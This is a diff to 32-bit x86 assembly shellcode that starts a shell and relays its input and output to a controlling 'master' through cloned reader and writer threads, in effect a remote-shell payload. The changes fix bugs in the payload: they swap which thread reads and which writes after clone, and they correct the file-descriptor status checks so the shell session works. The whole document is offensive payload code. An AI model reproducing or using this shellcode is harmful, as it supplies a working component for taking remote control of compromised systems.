@@ -5,7 +5,7 @@ BITS 32
 ; syscall return: EAX
 
 start:
-	call	shcode_start
+	call near shcode_start
 shcode_start:
 	pop	ebp
 	sub	ebp, shcode_start
@@ -117,9 +117,11 @@ parent:
 	int	0x80
 
 	cmp	eax,0
-	je	thread_read_from_master	; original is reader
-	jg	thread_write_to_master	; clone is writer
-	; error if <0
+	; ret=0 -> clone
+	je	thread_write_to_master	; clone is writer
+	; ret>0 -> original
+	jg	thread_read_from_master	; original is reader
+	; error if ret<0
 	jmp	child_dead
 
 	; ==================================== the READER thread:
@@ -133,7 +135,8 @@ reader_while_fds_ok:
 	; while both FDs are ok:
 	mov	al,[ebp+to_child_ok]
 	add	al,[ebp+from_child_ok]
-	jnz	leave_sh_second_interleaved
+	cmp	al,2
+	jne	leave_sh_second_interleaved
 
 	; test, if master requested child to be terminated
 	mov	ebx,ebp
@@ -141,6 +144,9 @@ reader_while_fds_ok:
 	mov	al,[ebx]
 	cmp	al,0
 	je	do_terminate_child
+
+
+
 
 
 
@@ -174,7 +180,10 @@ writer_while_fds_ok:
 	; while both FDs are ok:
 	mov	al,[ebp+to_child_ok]
 	add	al,[ebp+from_child_ok]
-	jnz	child_dead
+	cmp	al,2
+	jne	child_dead
+
+
 
 
 
